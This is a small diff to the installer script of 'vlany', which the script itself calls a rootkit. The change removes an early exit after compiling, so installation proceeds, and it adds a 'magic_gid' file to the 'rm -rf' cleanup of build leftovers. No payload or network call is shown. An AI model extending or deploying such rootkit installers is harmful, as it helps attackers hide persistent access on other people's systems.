@@ -357,9 +357,8 @@ if [ "$1" == "--cli" ]; then
     compile_vlany
     echo "Rootkit libraries compiled."
     sleep 2
-    exit
 
-    [ $STATUS == "compile" ] && { rm -rf *.o bashrc shell_msg bd_readme; exit; }
+    [ $STATUS == "compile" ] && { rm -rf *.o magic_gid bashrc shell_msg bd_readme; exit; }
 
     echo "Installing vlany."
     sleep 1
